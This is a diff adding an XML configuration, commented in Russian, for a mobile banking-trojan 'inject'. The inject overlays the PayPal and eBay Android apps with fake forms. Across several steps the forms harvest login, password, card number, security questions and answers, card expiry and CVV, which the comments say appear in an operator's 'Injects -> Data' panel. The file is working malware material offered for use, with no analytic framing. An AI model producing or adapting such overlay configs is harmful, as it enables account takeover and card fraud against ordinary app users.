@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="UTF-8"?><!-- Файл должен быть в кодировке UTF-8 (без BOM) -->
+<document>
+	<name>Paypal</name><!-- Название инжекта -->
+	<apps>com.paypal.android.p2pmobile;com.ebay.mobile</apps><!-- Приложения, которые будут перекрываться (через точку с запятой) -->
+	<size>1</size><!-- Размер инжекта (1 - стандартный, 2 - в виде диалога) -->
+	<storage>1</storage><!-- Место хранения инжекта (1 - в устройстве, 2 - на сервере) -->
+	
+	<step><!-- Новый шаг (форма) -->
+		<param>
+			<column>Login</column>
+			<name>login</name>
+		</param>
+		
+		<param><!-- Параметр в шаге (форме) -->
+			<column>Password</column><!-- Название колонки (для вкладки "Инжекты"->"Данные") -->
+			<name>password</name><!-- Название параметра (поле name в форме в файле index.html) -->
+		</param>
+
+		<param>
+			<column>Card Number</column>
+			<name>card_number</name>
+		</param>
+	</step>
+
+	<step>
+		<param>
+			<column>Question 1</column>
+			<name>vopros1</name>
+		</param>
+		
+		<param>
+			<column>Answer 1</column>
+			<name>otvet1</name>
+		</param>
+
+		<param>
+			<column>Question 2</column>
+			<name>vopros2</name>
+		</param>
+		
+		<param>
+			<column>Answer 2</column>
+			<name>otvet2</name>
+		</param>
+	</step>
+
+	<step>
+		<param>
+			<column>MM</column>
+			<name>expiry_month</name>
+		</param>
+
+		<param>
+			<column>YY</column>
+			<name>expiry_year</name>
+		</param>
+	</step>
+
+	<step>
+		<param>
+			<column>CVV</column>
+			<name>cvv</name>
+		</param>
+	</step>
+
+</document>
